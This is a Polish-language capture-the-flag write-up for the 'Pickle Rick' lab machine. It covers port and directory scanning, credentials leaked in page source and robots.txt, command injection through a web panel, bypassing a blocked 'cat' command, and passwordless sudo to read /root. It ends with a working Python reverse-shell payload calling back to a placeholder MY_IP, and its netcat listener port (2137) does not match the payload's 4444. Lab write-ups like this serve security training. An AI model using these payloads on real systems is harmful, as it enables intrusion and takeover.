# Pickle Rick

## Recon

Przeskanujmy porty dla aplikacji:

```
nmap -sS -T5 -vvvv -Pn -p- 10.10.149.242
```

Otwarte porty: 22 i 80

Wiemy też, że mamy do czynienia z systemem Ububntu.

Poszukajmy też podstron:

```
gobuster dir -u http://10.10.149.242/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
```

W między czasie popatrzmy na stronę główną. W kodzie strony widzimy notkę: 
```
Note to self, remember username!

Username: R1ckRul3s
```

Go buster zakończył prace, znalazł folder `/assets` i `/server-status`, do którego nie mamy dostępu. Sprawdźmy więc ten pierwszy.

Włączone ma indeksowanie, widzimy pare plików, w tym 2 gify i 2 jpg, jeden znajdujący się na stronie głównej.

Sprawdźmy czy te obrazki nie mają ukrytej zawartości. No nie bardzo bym powiedział.

Szukajmy więc dalej, może nie foldery, a pliki są ukryte.

```
gobuster dir -u http://10.10.149.242/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -x .txt,.php,.html,.js
```

Znaleźliśmy pare plików, `login.php`, `portal.php`, `robots.txt`

Sprawdźmy `robots.txt`. Jego zawartość to wymowne "Wubbalubbadubdub"

`login.php` to formularz logowania, tylko nie mamy hasła. Szukajmy dalej.

`portal.php` przekierowuje nas do `login.php`, tak jakby potrzebowalibyśmy być zalogowani. Spróbujmy czegoś głupiego i sie zalogujmy.

Dziwny tekst z `robots.txt` okazał się być hasłem dla użytkownika R1ckRul3s, nice.

## Command Execution

Wylądowaliśmy na stronie "Command Panel" z formularzem, do innych zakładek nie mamy dostępu bo nie jesteśmy prawdziwym Rickiem.

Spróbujmy wykonać polecenie `whoami`. Dostaliśmy odpowiedź www-data. Sprawdźmy, czy znajdziemy tu podatność RCE albo podobną.

Polecenie `whoami; ls` wykonało się, odkrywając dodatkowe pliki: `Sup3rS3cretPickl3Ingred.txt`, `clue.txt`, `denied.php`. Sprawdźmy co zawierają.

Pierwszy zawiera pierwszy składnik potrzebny do uratowania Ricka. `clue.txt` to podpowiedź, aby szukać następnego składnika w plikach systemowych. A trzeci to podstrona do której nie ma dostępu, tak jak nazwa mówi.

Spróbujmy poszukać czegoś w systemie. Sprawdźmy na początek katalog `/home`. Są dwaj użytkownicy, "rick" i "ubuntu". Najpierw sprawdźmy ricka. Jest tam plik `second ingredients`. Tylko komenda `cat` jest zabroniona. Spróbujmy mniej oczywiste komendy, jak `nl`. To zadziałało i mamy drugi składnik.

Katalog `/home/ubuntu` jest pusty, więc zakładam, że ostatni składnik będzie w `/root`. Sprawdźmy poleceniem `sudo -l` co możemy uruchomić z podniesionymi uprawnieniami bez podawania hasła.

```
User www-data may run the following commands on ip-10-10-149-242:
    (ALL) NOPASSWD: ALL
```

Dziwne, można każdą jedną komendę uruchomić. Wyświetlmy więc zawartość `/root`. Znaleźliśmy plik `3rd.txt` i tam jest nasza odpowiedź.

## Reverse shell

Można też wytworzyć reverse shella. W jaki sposób?

Z racji że mamy do czynienia z Linuxem Ubuntu, sprawdźmy czy jest na nim zainstalowany Python, poleceniem `python3 -V`. Dostaliśmy: 

```
Python 3.8.10
```

Spróbujmy więc nawiązać połączenie. Użyjmy takiego payloadu:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MY_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

Wcześniej włączmy nasłuchiwanie na porcie 4444 na naszej maszynie:

```
nc -lvnp 2137
```

Wklejmy i wykonajmy payloada. Strona będzie wyglądać jakby się zawiesiła, ale gdy wrócimy do terminala, zobaczymy 

```
connect to [MY_IP] from (UNKNOWN) [10.10.149.242] 44870
www-data@ip-10-10-149-242:/var/www/html$
```

Można wykonać troche wygodniej te same kroki co wcześniej.
